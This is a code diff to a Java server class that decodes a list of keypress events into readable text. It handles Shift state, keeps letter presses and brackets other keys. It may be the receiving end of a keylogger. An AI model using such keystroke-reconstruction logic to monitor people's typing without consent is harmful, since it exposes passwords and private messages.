@@ -105,6 +105,7 @@ public class Server implements Runnable {
                         boolean shift = false;
                         boolean capslock = false;
                         String output = "";
+                        String[] alphabet = new String[]{"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"};
                         for (String s : keypresses) {
                             if (s.indexOf("Unknown")==-1) {
                                 if (s.indexOf("Shift")!=-1) {
@@ -123,13 +124,19 @@ public class Server implements Runnable {
                                         }
                                     }
                                 }
-                                String seg = s;
-                                if (shift) {
-                                    seg = seg.toUpperCase();
+                                if (Arrays.asList(alphabet).contains(s.substring(2).toLowerCase())) {
+                                    if (s.substring(0,1).equals("p")) {
+                                        String seg = s;
+                                        if (shift) {
+                                            seg = seg.toUpperCase();
+                                        } else {
+                                            seg = seg.toLowerCase();
+                                        }
+                                        output = output+seg;
+                                    }
                                 } else {
-                                    seg = seg.toLowerCase();
+                                    output = output+"["+s.substring(2).toUpperCase()+"]";
                                 }
-                                output = output+seg;
                             }
                         }
                         System.out.println(output);
